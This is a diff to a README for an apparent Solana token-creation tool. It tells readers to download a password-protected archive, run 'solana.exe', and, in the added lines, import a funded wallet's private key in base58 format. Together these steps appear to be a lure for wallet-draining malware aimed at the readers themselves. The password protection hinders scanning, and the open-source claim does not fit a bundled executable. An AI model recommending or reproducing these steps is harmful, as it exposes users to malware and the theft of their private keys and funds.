@@ -9,6 +9,10 @@ Free open-sources software for creating your own token on the solan blockchain w
 ## The archive password is ***S0Lbot!bysmoke***
  *Download the archive, unzip it and launch the "solana.exe" file
 
+# Creation
+
+To create a token, you need to import the wallet's private key in base58 format, which should have the right amount of solana to pay off the fee
+
 # Features
 
 + Token name customization 
